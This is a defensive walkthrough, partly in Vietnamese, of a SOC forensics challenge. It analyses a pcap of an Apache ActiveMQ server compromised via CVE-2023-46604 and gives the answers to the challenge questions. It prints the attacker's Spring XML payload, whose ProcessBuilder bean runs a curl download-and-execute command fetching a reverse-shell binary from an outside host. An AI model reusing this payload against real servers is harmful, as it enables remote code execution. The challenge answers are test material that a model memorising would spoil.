# Mô tả

During your shift as a tier-2 SOC analyst, you receive an escalation from a tier-1 analyst regarding a public-facing server. This server has been flagged for making outbound connections to multiple suspicious IPs. In response, you initiate the standard incident response protocol, which includes isolating the server from the network to prevent potential lateral movement or data exfiltration and obtaining a packet capture from the NSM utility for analysis. Your task is to analyze the pcap and assess for signs of malicious activity.

# Phân tích

## Q1

**By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?**

`146.190.21.92`

## Q2 

**Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?**

`61616`

## Q3

**Following up on the previous question, what is the name of the service found to be vulnerable?**

Tìm trong protocol `Open Wire` thấy có entry này `ProviderName, ActiveMQ` tìm thêm trên google sẽ biết nó là  một Message Oriented Middleware(MOM) một phần của Apache

`Apache ActiveMQ`

## Q4

**The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?**

Tại packet 14 thấy người dùng gửi request đến server C2 thứ nhất lấy file `invoice.xml`

```xml
GET /invoice.xml HTTP/1.1
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/11.0.21
Host: 146.190.21.92:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Tue, 12 Dec 2023 13:38:28 GMT
Content-type: application/xml
Content-Length: 816
Last-Modified: Tue, 12 Dec 2023 13:37:45 GMT

<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <!--value>open</value>
                <value>-a</value>
                <value>calculator</value -->
                <value>bash</value>
                <value>-c</value>
                <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Nhưng mà nội dung file xml này lại khá lạ, nó muốn thực hiện lệnh `bash -c curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker` để tải một file tên là `docker` từ `128.199.52.72` sau đó lưu vào thư mục `/tmp/docker` và rồi chạy nó. Khả năng cao là nếu người dùng mà mở file `invoce.xml` sẽ thực hiện lệnh này trên máy thông qua việc khởi tạo class java `java.lang.ProcessBuilder` 

Tiếp tục tại packet 34 ta thấy người dùng có gửi một request đến `128.199.52.72`lấy file `docker`

```
GET /docker HTTP/1.1
Host: 128.199.52.72
User-Agent: curl/7.68.0
Accept: */*


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Tue, 12 Dec 2023 13:38:28 GMT
Content-type: application/octet-stream
Content-Length: 250
Last-Modified: Tue, 12 Dec 2023 12:23:04 GMT
```

## Q5

**Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?**

`docker`

## Q6

**What Java class was invoked by the XML file to run the exploit?**

`java.lang.ProcessBuilder`

## Q7

**To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?**

Từ các dữ kiện trên ta biết được hacker lợi dụng lỗ hổng của `Apache ActiveMQ` gửi một file XML chứa payload độc hại cho người dùng và sau đó nếu mở thì sẽ drop một file PE vào máy. Một lỗ hổng RCE

Lên google tìm `Apache ActiveMQ RCE CVE`

https://activemq.apache.org/news/cve-2023-46604

**CVE-2023-46604** là một lỗ hổng (RCE) trong Apache ActiveMQ. Lỗ hổng này cho phép hacker gửi một payload độc hại (ví dụ như một file XML được thiết kế đặc biệt) đến máy chủ sử dụng ActiveMQ. Nếu được xử lý bởi hệ thống dễ bị tấn công, payload này có thể khiến máy chủ thực thi mã tùy ý như là drop một file PE

## Q8

**The vendor addressed the vulnerability by adding a [validation step](https://github.com/apache/activemq/pull/1098/commits/3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b) to ensure that only valid `Throwable` classes can be instantiated, preventing exploitation. In which Java class and method was this validation step added?**

Ở trên thì hacker đã gửi một file XML(Là một spring bean config) đến ActiveMQ - một hệ thống xử lí được bean từ XML. Sau đó hệ thống sẽ tự động deserialize hoặc load XML mà không kiểm tra xem class đó làm gì

Và để phòng tránh việc đó xảy sẽ thêm check vào các hàm để chỉ cho phép deserialize các class được kế thừa từ `throwable`

```java
public abstract class BaseDataStreamMarshaller implements DataStreamMarshaller {
@@ -228,8 +229,11 @@ protected Throwable tightUnmarsalThrowable(OpenWireFormat wireFormat, DataInput
    private Throwable createThrowable(String className, String message) {
        try {
            Class clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());
            OpenWireUtil.validateIsThrowable(clazz);
            Constructor constructor = clazz.getConstructor(new Class[] {String.class});
            return (Throwable)constructor.newInstance(new Object[] {message});
        } catch (IllegalArgumentException e) {
            return e;
        } catch (Throwable e) {
            return new Throwable(className + ": " + message);
        }
```

`BaseDataStreamMarshaller.createThrowable`

